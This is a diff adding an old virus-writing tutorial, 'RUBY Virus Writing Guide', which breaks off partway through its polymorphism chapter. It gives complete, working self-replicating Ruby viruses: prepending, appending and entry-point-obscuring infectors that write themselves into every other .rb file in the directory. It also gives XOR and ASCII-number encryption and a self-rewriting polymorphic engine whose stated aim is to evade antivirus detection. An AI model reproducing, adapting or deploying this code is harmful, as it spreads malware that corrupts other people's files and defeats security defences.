@@ -1,0 +1,1038 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************       RUBY Virus Writing Guide       ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro Words
+
+  1) File infection
+       a) Prepending
+       b) Appending
+       c) Entry Point Obscuring
+
+  2) Encryption
+       a) Virus as ASCII numbers
+       b) Virus as Characters
+
+  3) Polymorphism
+       a) Random encryption: ASCII number function
+       b) Code-As-String morphing
+       c) Adding Trash
+       d) Variable-Name Changing
+       e) Number Changing
+       f) Permutation
+
+  4) Last Words
+
+
+
+
+
+  0) Intro Words
+
+  Ruby is an interpreted script language, which is mainly used for web-sites.
+  You can do alot of things with Ruby. The language's syntax has quite a lot realtion-
+  ship to the C-syntax, but the whole language seems to be nearer to PHP or VB. It's
+  a quite nice mixture of several famouse language, therefore it should not
+  be that problem to learn the language, if you already know some other web-based
+  script languages. The official site of Ruby is: http://www.ruby-lang.org/en/. 
+  The language has been done in japan, where it is very famouse.
+  I've read about Ruby in a Linux Magazine, with a Knoppix 3.6-script-edition CD.
+  As the text about Ruby was nice, I wanted to try it. And so I did. I've tested
+  every source with ActiveScriptRuby 1.8.1.2 (http://arton.hp.infoseek.co.jp/).
+  With this article I wanted to discover another language fully. I hope you like
+  it, if not, I don't care alot, because I had fun while writing it. :)
+
+
+
+
+
+  1) File infection
+
+     Writing a file infector seems to be the most important thing for such an article
+     therefore this is the first point. Well, now you will see some different types
+     of infection: prepender and appender (the standart-types) and EPO (the advanced file
+     infection). Just look at these codes and explanations!
+
+     a) Prepending
+        One of the standart-types of infection is prepending. Prepending is copying the
+        viruscode infront of the host file. Just look at the code, and then read the short
+        descriptiong. I'm sure you will understand, how it works.
+
+
+ - - - - - - - - - - - - - [ Ruby Prepender Virus Example ] - - - - - - - - - - - - -
+# RUBY.Paradoxon
+mycode=File.open(__FILE__).read(630)
+cdir = Dir.open(Dir.getwd)
+  cdir.each do |a|
+    if File.ftype(a)=="file" then
+      if a[a.length-3, a.length]==".rb" then
+        if a!=File.basename(__FILE__) then
+          fcode=""
+          fle=open(a)
+          spth=fle.read(1)
+          while spth!=nil
+            fcode+=spth
+            spth=fle.read(1)
+          end
+          fle.close
+          if fcode[7,9]!="Paradoxon" then
+            fcode=mycode+13.chr+10.chr+fcode
+            fle=open(a,"w")
+              fle.print fcode
+            fle.close
+          end
+        end
+      end
+    end
+  end
+cdir.close
+ - - - - - - - - - - - - - [ Ruby Prepender Virus Example ] - - - - - - - - - - - - -
+
+        The virus above is 'Ruby.Paradoxon', the very first virus infecting Ruby files.
+        I've done it in November 2004. I'll shourtly tell you, what the virus does:
+
+        --> Reads the own code (the own code isn't 630 bytes if you save it under Windows.
+                The reason is, that Ruby is a Linux script language, and in Linux Windows'
+                chr(13,10) = chr(10) - and Ruby calculates in Linux-size)
+        --> Opens the current directory
+        --> Checks if the founden item in the directory is a infectable file (.rb-file / not infected)
+        --> Reads the code of the new victim
+        --> Generates the new code (viruscode+13.chr+10.chr+hostcode)
+        --> Writes the new code to the victim
+        --> Closes directory
+
+
+
+
+
+
+     b) Appending
+
+        The second standart-type of infection is appending. An appender virus writes its code in
+        the end of the real code. As an result the virus runs after the hostfile. The following
+        code shows you, how such a virus could look like in Ruby.
+
+
+ - - - - - - - - - - - - - [ Ruby Appender Virus Example ] - - - - - - - - - - - - -
+# SPTH
+mycode=""
+mych=File.open(__FILE__)
+myc=mych.read(1)
+while myc!=nil
+  mycode+=myc
+  myc=mych.read(1)
+end
+mycode=mycode[mycode.length-734,734]
+cdir = Dir.open(Dir.getwd)
+  cdir.each do |a|
+    if File.ftype(a)=="file" then
+      if a[a.length-3, a.length]==".rb" then
+        if a!=File.basename(__FILE__) then
+          fcode=""
+          fle=open(a)
+          spth=fle.read(1)
+          while spth!=nil
+            fcode+=spth
+            spth=fle.read(1)
+          end
+          fle.close
+          if fcode[fcode.length-732,4]!="SPTH" then
+            fcode=fcode+13.chr+10.chr+mycode
+            fle=open(a,"w")
+              fle.print fcode
+            fle.close
+          end
+        end
+      end
+    end
+  end
+cdir.close
+ - - - - - - - - - - - - - [ Ruby Appender Virus Example ] - - - - - - - - - - - - -
+
+        Appender viruses are a little bit more difficult, but far away from hard :) Just look
+        at the explanation, if you dont understand, how it works:
+
+        --> Finds its own code at the end of the host-file
+        --> Opens current directory
+        --> Finds infectable files
+        --> Generates new code
+        --> Writes new code to file
+        --> Closes directory
+
+
+
+
+
+
+     c) Entry Point Obscuring
+
+        Entry Point Obscuring is the advanced way of infecting a file. It means, that the
+        code will be added at any variable offset. The result is, that AVs can not search
+        at any static address but have to search in the whole file for the virus. This leads
+        to a longer search-process.
+        The following example of a EPO Ruby virus infects the file anywhere in the middle.
+        Therefore it gets the lines of the file, calculate a random offset, and then include
+        inself between line 1 and N. Look at the code and the description below, to understand
+        how this works.
+
+ - - - - - - - - - - - - - [ Ruby EPO Virus Example ] - - - - - - - - - - - - -
+# SPTH
+mycode=""
+mych=File.open(__FILE__)
+myc=mych.read(1)
+while myc!=nil
+  mycode+=myc
+  myc=mych.read(1)
+end
+i=0
+while myc!="SPTH"
+  myc=mycode[i,4]
+  i+=1
+end
+mycode="# S"+mycode[i,1382]
+cdir = Dir.open(Dir.getwd)
+  cdir.each do |a|
+    if File.ftype(a)=="file" then
+      if a[a.length-3, a.length]==".rb" then
+        if a!=File.basename(__FILE__) then
+          fcode=""
+          fle=open(a)
+          spth=fle.read(1)
+          while spth!=nil
+            fcode+=spth
+            spth=fle.read(1)
+          end
+          fle.close
+          i=0
+          inf=0
+          lc=0
+          while i<fcode.length
+            i=i+1
+            if fcode[i,4]=="SPTH" then
+              inf=1
+            end
+            if fcode[i,1]==10.chr then
+              lc+=1
+            end
+          end
+          if inf!=1 then
+            ln=rand(lc)
+            precode=""
+            i=0
+            j=0
+            while i < ln
+              precode+=fcode[j,1]
+              j+=1
+              if fcode[j,1]==10.chr then
+                i+=1
+              end
+            end
+            newcode=precode+13.chr+10.chr+mycode+13.chr+10.chr
+            while j<=fcode.length
+              newcode+=fcode[j,1]
+              j+=1
+            end
+            fle=open(a,"w")
+              fle.print newcode
+            fle.close
+          end
+        end
+      end
+    end
+  end
+cdir.close
+ - - - - - - - - - - - - - [ Ruby EPO Virus Example ] - - - - - - - - - - - - -
+
+        As I've already written, the virus includes itself anywhere between the code.
+        Therefore it searchs all lines of the host and include itself anywhere between
+        the lines. The infected file could look like that after infection:
+        <l1,l2,l3,l4,l5><VIRUS><l6,l7,l8,l9,l10,l11,l12,l13,l14,l15>
+        Next points are more detailed descriptions of the code, how it works:
+
+        --> Opens the current file
+        --> Reads the filecontent
+        --> Searchs the 'SPTH'-string in the file
+        --> Read the whole virus
+        --> Opens the current directory
+        --> Finds infectable files
+        --> Reads the whole filecontent
+        --> Searchs the 'SPTH'-string, to know if the file is already infected
+        --> Gets the number of lines (searchs for chr(10))
+        --> Gets a random number between 0 and the number of lines (X)
+        --> Gets the code before line X
+        --> Adds the viruscode to the code before line X
+        --> Adds the rest of the file-content to the code
+        --> Writes the code to the file
+        --> Closes the current directory
+
+
+
+
+
+  2) Encryption
+
+     To fake AVs one word comes to the story: Encryption. The purpose of encryption
+     is to chiffer the code, that it can not be read in the normal way. A non-encrypted
+     virus is normally quiet easy to analyse and to detect. An encrypted virus is
+     different: The AV researcher first have to find the plain code. And the detection
+     routine has also to emuate the the decrytion routine of the virus. As a result
+     the time of detection increases. And that's a success for us! :)
+
+     a) Virus as ASCII numbers
+
+        This is a very easy and often used way of chiffering script and web-based languages.
+        You change the whole code into the ascii numbers of itself. With a polymorphic
+        engine you can increase the power of this technique very much (you will find that
+        technique above in the next chapter). Just look at the code, and understand, what
+        i mean.
+
+ - - - - - - - - - - - - - [ Encryption Example - Type I ] - - - - - - - - - - - - -
+eval(112.chr+114.chr+105.chr+110.chr+116.chr+40.chr+
+     34.chr+72.chr+101.chr+108.chr+108.chr+111.chr+
+     32.chr+118.chr+120.chr+101.chr+114.chr+115.chr+33.chr+34.chr+41.chr)
+ - - - - - - - - - - - - - [ Encryption Example - Type I ] - - - - - - - - - - - - -
+
+        The code contains one print-command, which writes one short (secret) sentence.
+        As you can see, you can not read the code without playing around with it. The code
+        uses an command called 'eval' to run commands. This is in this chapter our most
+        importend command. Well, I think you know how it works.
+
+
+
+
+
+     b) Virus as Characters 
+
+        The next encryption technique is also very often used in script languages. For
+        instance jackie has done the same thing in JavaScript. I thought it would also
+        be possible in Ruby, I was right. First I've tried to make a polymorphism engine,
+        but it was not possible, because of some special characters, and Ruby can not
+        ignore them. Therefore I had to make it just as simple encryption. The technique
+        works this way: An variable contains the code, XOR'ed with a number (key). Then
+        the decrytion routine gets the real code. After that the real code will be executed
+        (evaluated). Look at the example and try to understand what I mean:
+
+ - - - - - - - - - - - - - [ Encryption Example - Type II ] - - - - - - - - - - - - -
+code="¸˛Â‚¯§Æﬁ˘Óı”Âˇ”Ô„„‡∂•Æ•"
+i=0
+newcode=""
+while i<code.length
+  nc=eval("?"+code[i,1]) ^ 140
+  newcode+=nc.chr
+  i+=1
+end
+eval(newcode)
+ - - - - - - - - - - - - - [ Encryption Example - Type I) ] - - - - - - - - - - - - -
+
+        --> 'code' contains the encrypte (secret :D) message
+        --> The while gets every letter in the variable 'code'
+        --> nc=decrypted single character's number
+        --> newcode=character of the decrypted number
+        --> eval(newcode) = evaluates the whole decrypted code
+
+
+     There are several other ways to encrypt a Ruby script code, but it's possible to use
+     these techiques as random encryption, therefore I've added it in the next chapter:
+     Polymorphism.
+
+
+
+
+
+  3) Polymorphism
+
+     This word is very well known, and it's one of the best ways to fake AVs. In this
+     article I wanted to give you all ideas and codes I had about polymorphism. Short after
+     starting to write the article i've recognized that I have alot of ideas, how a Ruby
+     polymorphism could look like. The following codes aren't viruses, but just polymorphism
+     engines. It's quite easy to include them to a virus, therefore I haven't added a infection
+     routine. Well about polymorphism: Poly is a synonym for 'many' and morph means 'changing'.
+     That means, that polymorphism says 'many changes'. The following codes and ideas will tell
+     you, how a polymorphic virus in ruby could work. Just go on reading...
+
+     a) Random encrypter: ASCII Number function
+
+        This technique has it's code transformed into ASCII-numbers with two other values.
+        A function, which gets the 3 values then returns the real number. That means, that
+        the code is build of three values, which together become the real ASCII-number by a
+        decryption function. The following code morphes itself at every generation with this
+        technique:
+
+ - - - - - - - - - - - - - [ Polymorphism Example - ASCII Number function ] - - - - - - - - - - - - -
+def dc(a,b,c)
+  if c==0 then
+    numc=(a+b)
+  elsif c==1 then
+    numc=(a-b)
+  else
+    numc=(a/b)
+  end
+  return(numc.chr)
+end
+mf=34.chr+File.basename(__FILE__)+34.chr
+bn="\n"
+bs="\s"
+code=dc(17745,169,2)+dc(-36,97,0)+dc(9744,203,2)+bn+dc(168,58,1)+dc(247,146,1)+dc(316,197,1)+dc(8811,89,2)+dc(259,148,1)+dc(12300,123,2)+dc(7474,74,2)+dc(172,111,1)+dc(1870,55,2)+dc(7650,225,2)+bn+dc(131,12,1)+dc(-139,243,0)+dc(308,203,1)+dc(-131,239,0)+dc(20200,200,2)+bs+dc(116,11,1)+dc(5640,94,2)+dc(7326,74,2)+dc(134,23,1)+dc(90,10,0)+dc(8787,87,2)+dc(7452,162,2)+dc(-8,116,0)+dc(81,20,0)+dc(16060,146,2)+dc(253,150,1)+dc(-61,177,0)+dc(131,27,1)+bn+dc(44,61,0)+dc(161,59,1)+bs+dc(11088,112,2)+dc(165,54,1)+dc(-81,181,0)+dc(178,77,1)+dc(84,7,0)+dc(89,16,0)+dc(195,151,1)+dc(133,84,1)+dc(3534,38,2)+dc(127,66,1)+dc(98,37,1)+dc(441,9,2)+dc(-115,163,0)+dc(263,217,1)+dc(23067,233,2)+dc(217,113,1)+dc(199,85,1)+bs+dc(105,11,0)+dc(306,202,1)+dc(2323,23,2)+dc(-40,150,0)+bn+dc(23320,212,2)+dc(21816,216,2)+dc(26,93,0)+dc(-27,126,0)+dc(-129,240,0)+dc(306,206,1)+dc(909,9,2)+dc(107,64,1)+dc(13969,229,2)+dc(-155,206,0)+dc(-53,105,0)+dc(7958,173,2)+dc(19602,198,2)+dc(295,191,1)+dc(25422,223,2)+dc(-160,203,0)+dc(7410,130,2)+dc(8450,169,2)+dc(5336,116,2)+dc(273,174,1)+dc(-132,236,0)+dc(-84,198,0)+dc(129,3,2)+dc(-50,84,0)+dc(86,24,0)+dc(271,237,1)+dc(63,20,1)+dc(4539,89,2)+dc(1352,26,2)+dc(10672,232,2)+dc(6534,66,2)+dc(219,115,1)+dc(176,62,1)+dc(-162,205,0)+dc(1258,37,2)+dc(239,196,1)+dc(-218,252,0)+bn+dc(90,11,0)+dc(131,23,1)+dc(306,191,1)+dc(155,50,1)+dc(15606,153,2)+bs+dc(21384,216,2)+dc(7437,67,2)+dc(21700,217,2)+dc(8686,86,2)+dc(137,46,1)+dc(275,170,1)+dc(-98,142,0)+dc(6,43,0)+dc(21,72,0)+dc(33,28,0)+dc(296,235,1)+dc(-200,251,0)+dc(-117,167,0)+dc(6854,149,2)+dc(222,123,1)+dc(171,67,1)+dc(23256,204,2)+bs+dc(-46,162,0)+dc(66,38,0)+dc(200,99,1)+dc(7150,65,2)+bn+dc(-21,131,0)+dc(14241,141,2)+dc(-60,179,0)+dc(23859,241,2)+dc(283,172,1)+dc(117,17,1)+dc(335,234,1)+dc(-162,205,0)+dc(-11,72,0)+dc(230,179,1)+dc(10140,195,2)+dc(-158,204,0)+dc(18909,191,2)+dc(14560,140,2)+dc(14592,128,2)+dc(79,36,1)+dc(10602,186,2)+dc(-106,156,0)+dc(22,24,0)+dc(8217,83,2)+dc(7696,74,2)+dc(258,144,1)+dc(-169,212,0)+dc(185,151,1)+dc(27,88,0)+dc(118,84,1)+dc(145,102,1)+dc(8160,160,2)+dc(216,164,1)+dc(-178,224,0)+dc(20790,210,2)+dc(-46,150,0)+dc(-72,186,0)+dc(277,234,1)+dc(3672,108,2)+dc(9847,229,2)+dc(5134,151,2)+bn+dc(292,191,1)+dc(72,36,0)+dc(65,50,0)+dc(1890,18,2)+dc(21522,211,2)+bs+dc(105,6,1)+dc(139,28,1)+dc(-81,181,0)+dc(4343,43,2)+dc(319,228,1)+dc(224,119,1)+dc(217,173,1)+dc(237,188,1)+dc(-153,246,0)+dc(198,137,1)+dc(-74,135,0)+dc(147,90,1)+dc(2650,53,2)+dc(-20,66,0)+dc(88,11,0)+dc(286,182,1)+dc(-121,235,0)+bs+dc(6032,52,2)+dc(352,248,1)+dc(339,238,1)+dc(11990,109,2)+bn+dc(210,105,1)+dc(-105,207,0)+bs+dc(46,53,0)+dc(23976,216,2)+dc(20,80,0)+dc(25654,254,2)+dc(21,70,0)+dc(15015,143,2)+dc(176,4,2)+dc(238,188,1)+dc(-60,153,0)+dc(298,237,1)+dc(75,14,1)+dc(64,7,1)+dc(-61,111,0)+dc(99,53,1)+dc(258,159,1)+dc(2392,23,2)+dc(125,11,1)+dc(242,199,1)+dc(104,70,1)+dc(27,88,0)+dc(-112,146,0)+bs+dc(928,8,2)+dc(-22,126,0)+dc(23533,233,2)+dc(177,67,1)+bn+dc(293,183,1)+dc(17372,172,2)+dc(153,34,1)+dc(259,160,1)+dc(187,76,1)+dc(18400,184,2)+dc(189,88,1)+dc(263,220,1)+dc(156,95,1)+dc(69,35,1)+dc(22638,231,2)+dc(206,91,1)+dc(119,76,1)+dc(8228,242,2)+bn+dc(24543,243,2)+dc(62,46,0)+dc(-7,122,0)+dc(203,102,1)+bn+dc(3190,29,2)+dc(276,175,1)+dc(60,59,0)+dc(191,92,1)+dc(349,238,1)+dc(12,88,0)+dc(8787,87,2)+dc(-174,217,0)+dc(202,141,1)+dc(203,169,1)+dc(22,76,0)+dc(61,49,0)+dc(-198,241,0)+dc(2890,85,2)+bn+dc(1414,14,2)+dc(26840,244,2)+dc(-24,124,0)+bn+dc(148,43,1)+dc(10234,238,2)+dc(12505,205,2)+dc(784,16,2)+bn+dc(250,149,1)+dc(78,30,0)+dc(113,2,0)+dc(144,39,1)+dc(119,17,1)+bs+dc(-36,135,0)+dc(444,4,2)+dc(300,3,2)+dc(130,29,1)+dc(-133,224,0)+dc(254,149,1)+dc(22,22,0)+dc(53,4,1)+dc(145,52,1)+dc(-145,206,0)+dc(303,242,1)+dc(13794,242,2)+dc(-1,54,0)+dc(201,155,1)+dc(20889,211,2)+dc(208,104,1)+dc(-132,246,0)+bs+dc(361,245,1)+dc(300,196,1)+dc(-30,131,0)+dc(-140,250,0)+bn+dc(14080,128,2)+dc(8383,83,2)+dc(-64,183,0)+dc(5940,60,2)+dc(54,57,0)+dc(297,197,1)+dc(13,88,0)+dc(-159,202,0)+dc(1403,23,2)+dc(4114,121,2)+dc(-117,226,0)+dc(147,45,1)+dc(-143,186,0)+dc(4624,136,2)+bn+dc(5565,53,2)+dc(216,173,1)+dc(-128,189,0)+dc(14,41,0)+bn+dc(94,7,0)+dc(25056,232,2)+dc(24725,215,2)+dc(21715,215,2)+bn+dc(105,7,1)+dc(-146,207,0)+dc(111,10,1)+dc(17228,146,2)+dc(21534,222,2)+dc(12420,115,2)+dc(3320,83,2)+dc(206,172,1)+dc(15939,253,2)+dc(243,209,1)+dc(259,216,1)+dc(19107,193,2)+dc(63,48,0)+dc(-48,148,0)+dc(220,119,1)+dc(-133,224,0)+dc(174,69,1)+dc(6380,145,2)+dc(10878,222,2)+dc(191,98,1)+dc(87,46,1)+bn+dc(8778,77,2)+dc(-26,136,0)+dc(107,9,1)+dc(244,4,2)+dc(214,100,1)+dc(124,27,1)+dc(144,34,1)+dc(-142,242,0)+dc(-6,46,0)+dc(-9,59,0)+dc(211,158,1)+dc(85,33,1)+dc(7462,182,2)+dc(200,157,1)+dc(3136,64,2)+bn+dc(0,114,0)+dc(12210,111,2)+dc(-35,134,0)+dc(3477,57,2)+dc(55,59,0)+dc(22989,237,2)+dc(225,115,1)+dc(6500,65,2)+dc(-151,191,0)+dc(12087,237,2)+dc(109,68,1)+bn+dc(22365,213,2)+dc(6426,63,2)+bs+dc(324,210,1)+dc(21230,193,2)+dc(19206,194,2)+dc(14518,238,2)+dc(12627,207,2)+dc(256,208,1)+bs+dc(325,209,1)+dc(198,94,1)+dc(272,171,1)+dc(90,20,0)+bn+dc(880,8,2)+dc(79,22,0)+dc(22015,185,2)+dc(11583,117,2)+dc(-28,139,0)+dc(111,11,1)+dc(99,2,0)+dc(774,18,2)+dc(2440,40,2)+dc(251,217,1)+dc(106,6,1)+dc(22,77,0)+dc(-95,135,0)+dc(408,12,2)+dc(214,171,1)+dc(323,240,1)+dc(-72,188,0)+dc(104,10,0)+dc(359,254,1)+dc(288,178,1)+dc(77,26,0)+dc(-132,172,0)+dc(143,45,1)+dc(187,142,1)+dc(19266,169,2)+dc(342,232,1)+dc(-108,206,0)+dc(281,240,1)+dc(-179,222,0)+dc(178,144,1)+dc(-27,71,0)+dc(5338,157,2)+dc(-191,234,0)+dc(-44,127,0)+dc(17400,150,2)+dc(167,53,1)+dc(262,157,1)+dc(18480,168,2)+dc(-56,159,0)+dc(-34,74,0)+dc(16758,147,2)+dc(177,67,1)+dc(275,177,1)+dc(104,63,1)+dc(129,3,2)+dc(202,168,1)+dc(-150,194,0)+dc(-22,56,0)+dc(2752,64,2)+dc(123,40,1)+dc(21924,189,2)+dc(-44,158,0)+dc(3360,32,2)+dc(188,78,1)+dc(-34,137,0)+dc(-198,238,0)+dc(240,126,1)+dc(144,34,1)+dc(-82,181,0)+dc(9553,233,2)+dc(127,84,1)+dc(-71,105,0)+dc(193,152,1)+dc(-167,210,0)+dc(7820,230,2)+bn+dc(6,95,0)+dc(-47,155,0)+dc(-32,147,0)+dc(254,149,1)+dc(11118,109,2)+bs+dc(19380,170,2)+dc(25630,233,2)+dc(7623,77,2)+dc(283,222,1)+dc(976,16,2)+dc(48,1,0)+bn+dc(287,177,1)+dc(284,183,1)+dc(358,239,1)+dc(277,178,1)+dc(13542,122,2)+dc(-20,120,0)+dc(227,126,1)+dc(-118,161,0)+dc(5551,91,2)+dc(27,7,0)+dc(4300,43,2)+dc(15741,159,2)+dc(228,188,1)+dc(1428,42,2)+dc(122,79,1)+dc(16600,200,2)+dc(322,206,1)+dc(104,10,0)+dc(9135,87,2)+dc(3630,33,2)+dc(21733,211,2)+dc(-206,246,0)+dc(686,7,2)+dc(171,128,1)+dc(-3,117,0)+dc(-78,188,0)+dc(2646,27,2)+dc(7995,195,2)+dc(287,244,1)+dc(1020,30,2)+dc(10472,238,2)+dc(282,248,1)+dc(-118,161,0)+dc(33,50,0)+dc(16936,146,2)+dc(98,16,0)+dc(22470,214,2)+dc(5,105,0)+dc(5665,55,2)+dc(8080,202,2)+dc(188,74,1)+dc(228,118,1)+dc(287,189,1)+dc(-78,119,0)+dc(-88,131,0)+dc(4046,119,2)+dc(2772,63,2)+dc(46,12,1)+dc(5375,125,2)+dc(53,30,0)+dc(-116,232,0)+dc(205,91,1)+dc(131,26,1)+dc(342,232,1)+dc(-83,186,0)+dc(560,14,2)+dc(138,24,1)+dc(11770,107,2)+dc(304,205,1)+dc(-42,83,0)+dc(69,26,1)+dc(-212,246,0)+dc(-55,96,0)+dc(86,43,1)+dc(-181,215,0)+bn+dc(247,146,1)+dc(279,171,1)+dc(261,146,1)+dc(-103,204,0)+bs+dc(12,102,0)+dc(12760,116,2)+dc(293,194,1)+dc(85,24,1)+dc(190,129,1)+dc(-40,90,0)+bn+dc(341,231,1)+dc(157,56,1)+dc(26894,226,2)+dc(11,88,0)+dc(41,70,0)+dc(38,62,0)+dc(12322,122,2)+dc(260,217,1)+dc(-151,212,0)+dc(141,107,1)+dc(81,19,0)+dc(245,146,1)+dc(-135,175,0)+dc(-108,142,0)+dc(81,38,1)+dc(10292,124,2)+dc(18676,161,2)+dc(28728,252,2)+dc(177,72,1)+dc(121,11,1)+dc(292,189,1)+dc(-82,122,0)+dc(-106,204,0)+dc(-151,193,0)+dc(22230,195,2)+dc(10560,96,2)+dc(196,2,2)+dc(5904,144,2)+dc(105,62,1)+dc(170,136,1)+dc(-105,149,0)+dc(174,140,1)+dc(49,6,1)+dc(9047,109,2)+dc(77,39,0)+dc(93,21,0)+dc(12915,123,2)+dc(14080,128,2)+dc(322,219,1)+dc(-80,120,0)+dc(167,53,1)+dc(7150,65,2)+dc(49,49,0)+dc(3608,88,2)+dc(276,233,1)+dc(3638,107,2)+dc(6776,154,2)+dc(39,5,1)+dc(28,15,0)+dc(-171,254,0)+dc(9744,84,2)+dc(-50,164,0)+dc(297,192,1)+dc(308,198,1)+dc(21,82,0)+dc(4520,113,2)+dc(-46,160,0)+dc(156,46,1)+dc(304,205,1)+dc(8692,212,2)+dc(-112,155,0)+dc(4454,131,2)+dc(59,18,1)+dc(-106,149,0)+dc(75,41,1)+bn+dc(-95,196,0)+dc(56,54,0)+dc(182,82,1)+bn+dc(-48,149,0)+dc(293,183,1)+dc(8700,87,2)+bn+dc(15435,147,2)+dc(11,32,0)+dc(0,61,0)+dc(240,191,1)+bn+dc(-55,156,0)+dc(-91,201,0)+dc(-101,201,0)+bn+dc(320,210,1)+dc(224,123,1)+dc(297,178,1)+dc(341,242,1)+dc(-55,166,0)+dc(25100,251,2)+dc(33,68,0)+dc(7076,116,2)+dc(279,169,1)+dc(66,35,0)+dc(20825,175,2)+dc(16335,165,2)+dc(176,65,1)+dc(22400,224,2)+dc(88,13,0)+dc(8645,95,2)+dc(9360,195,2)+dc(186,142,1)+dc(215,105,1)+dc(78,23,0)+dc(222,103,1)+dc(225,126,1)+dc(111,1,2)+dc(166,66,1)+dc(267,166,1)+dc(-95,141,0)+dc(10476,97,2)+dc(-90,191,0)+dc(-15,125,0)+dc(-110,213,0)+dc(29464,254,2)+dc(-150,254,0)+dc(114,69,1)+dc(5194,106,2)+dc(124,31,1)+bn+dc(240,131,1)+dc(-57,118,0)+dc(4551,41,2)+dc(10,102,0)+dc(19796,196,2)+dc(307,197,1)+dc(39,1,0)+mf+dc(-60,101,0)+bn+dc(13,87,0)+dc(39,62,0)+dc(177,78,1)+dc(59,42,0)+dc(24200,220,2)+dc(-134,195,0)+dc(21037,193,2)+dc(-197,243,0)+dc(12426,109,2)+dc(140,39,1)+dc(4365,45,2)+dc(287,187,1)+dc(6040,151,2)+dc(10633,217,2)+dc(-193,249,0)+dc(-58,110,0)+dc(-206,247,0)+bn+dc(18312,168,2)+dc(5106,111,2)+dc(184,85,1)+dc(266,158,1)+dc(5439,49,2)+dc(-123,238,0)+dc(12524,124,2)+bn+dc(23544,216,2)+dc(2684,44,2)+dc(4995,45,2)+dc(11984,107,2)+dc(120,19,1)+dc(-132,242,0)+dc(4600,115,2)+mf+dc(10384,236,2)+dc(-140,174,0)+dc(218,99,1)+dc(34,1,2)+dc(4961,121,2)+bn+dc(218,2,2)+dc(179,133,1)+dc(282,163,1)+dc(156,42,1)+dc(25,80,0)+dc(248,132,1)+dc(4747,47,2)+dc(-69,109,0)+dc(77,23,0)+dc(346,245,1)+dc(79,20,0)+dc(221,120,1)+dc(23210,211,2)+dc(279,236,1)+dc(-1,35,0)+bn+dc(10692,108,2)+dc(-48,159,0)+dc(327,227,1)+dc(9494,94,2)+dc(-66,127,0)+dc(237,203,1)+dc(8901,207,2)+dc(-86,196,0)+dc(218,117,1)+dc(363,244,1)+dc(24948,252,2)+dc(1998,18,2)+dc(263,163,1)+dc(11413,113,2)+dc(197,154,1)+dc(135,101,1)+bn+dc(11211,111,2)+dc(89,29,0)+dc(327,230,1)+dc(648,6,2)+dc(196,156,1)+dc(205,106,1)+dc(119,8,1)+dc(22700,227,2)+dc(2525,25,2)+dc(257,216,1)+dc(-190,224,0)+dc(-138,179,0)+bn+dc(326,217,1)+dc(9844,214,2)+dc(-116,215,0)+dc(174,66,1)+dc(33,78,0)+dc(-110,225,0)+dc(4040,40,2)
+eval(code)
+ - - - - - - - - - - - - - [ Polymorphism Example - ASCII Number function ] - - - - - - - - - - - - -
+
+        This is the real polymorphism engine. The encrypted text contains the encrypter. You can not
+        understand the chiffer-text without encrypting it, therefore I've added the unencrypted sample.
+        The explanation follows later on:
+
+
+ - - - - - - - - - - - - - [ Polymorphism Example I - Inside ] - - - - - - - - - - - - -
+i=0
+newcode=""
+while i<code.length
+  if code[i,1]==10.chr then
+    newcode+=34.chr+92.chr+"n"+34.chr+"+"
+  elsif code[i,1]==32.chr then
+    newcode+=34.chr+92.chr+"s"+34.chr+"+"
+  elsif code[i,1]==92.chr then
+    if code[i,2]==92.chr+"s" then
+      newcode+="bs+"
+    else
+      newcode+="bn+"
+    end
+    i+=1
+  elsif code[i,1]==95.chr then
+    newcode+="mf+"
+    i+=7
+  else
+    b=eval("?"+code[i,1])
+    rnb=rand(254)+1
+    rnc=rand(3)
+    if rnc==0 then
+      newcode+="dc("+String(b-rnb)+","+String(rnb)+","+String(rnc)+")+"
+    elsif rnc==1
+      newcode+="dc("+String(b+rnb)+","+String(rnb)+","+String(rnc)+")+"
+    else rnc==2
+      newcode+="dc("+String(b*rnb)+","+String(rnb)+","+String(rnc)+")+"
+    end
+  end
+  i+=1
+end
+newcode=newcode[0,newcode.length-1]
+m=open(__FILE__)
+  decen=m.read(184)
+m.close
+m=open(__FILE__,"w")
+  m.write(decen+"\ncode="+newcode+"\neval(code)")
+m.close
+ - - - - - - - - - - - - - [ Polymorphism Example I - Inside ] - - - - - - - - - - - - -
+
+        Now you should understand how it works, if you look at the code. The whole thing works
+        like that:
+        --> The variable 'code' contains all the encrypted content. One letter is originally a
+            call to the decryption-routine. It contains three values, for decryption. Such a
+            decryption allows 255*3 variant for every character.
+        --> After decryting the whole code, three variables (bn, bs, mf) will be defined. They are
+            important, because Ruby can not find the ascii-numbers of 10.chr / 32.chr or can not
+            work with the pre-defined variable "__FILE__". __FILE__ returns the current path and
+            filename. As Ruby is Lunix based, the path uses "/" (slashes) beside of "\" (backslashed).
+            There the File class method "basename" helps. File.basename returns the last slash-delimited
+            component of the filename. So we solved the problem with the (back-)slashes.
+        --> The decryption routine, which gets the three values returns the real character of the
+            decryted value. The three values: a (the result), b (random number), c (calculation type)
+            A character, for instance 'A' = 65.chr. Let's make it encrypted: dc(20,45,0) means:
+            20 (a) + (c) 45 (b) = 65, or: dc(13000, 200, 2) means: 13000 (a) / (c) 200 (b) = 65.
+        --> After encryption the code will be executed with the command "eval". This evaluates
+            expressions as a Ruby program. 
+        --> The encryption routine has a while in it to get every single letter of the decrypted variable
+            'code'.
+        --> First it checks, if the string is 10/32/92/95.chr. If so, it will not encrypt it, but use
+            a variable for the code.
+        --> b=eval("?"+code[i,1]) - This is maybe the most important command in the whole engine.
+            ?A returns for instance 65. But if a string is "?A", it will not change, so the string has
+            to be evaluated to get the real character number of a letter. code[i,1] is one letter of
+            the current position in the file (from the filepointer).
+        --> Next step is to get two random numbers, one between 1-254 (rnb) and one between 0-2 (rnc).
+            'rnc' is responsible for the calculation type (add, sub, mul), and 'rnb' is the number which
+            will be added/sub'ed/mul'ed with the original character number of the letter. Here
+            the encryted function will be created and added to the 'newcode' variable.
+        --> After that the current file will be opened and 184 bytes will be read. These bytes are the
+            decryption engine for the next generation. This decrypter doesn't change because this is just
+            an example of THIS poly engine.
+        --> In the end the current file will be opened and the code will be written to it.
+
+
+
+
+
+    b) Code-As-Sting morphing
+
+       As a code could be evaluated as a String, and we could morph a String, and it still has the
+       original content, we could use a String as our code. This time we don't use a decrypting routine
+       but use variables and character-numbers for self-converting it to the old plain text. A shourt
+       explanation is this code-snip:
+
+           code='Code-As-String morphing'
+
+       could also be
+
+           ehxx='o'
+           cojf='s'
+           qtze='r'
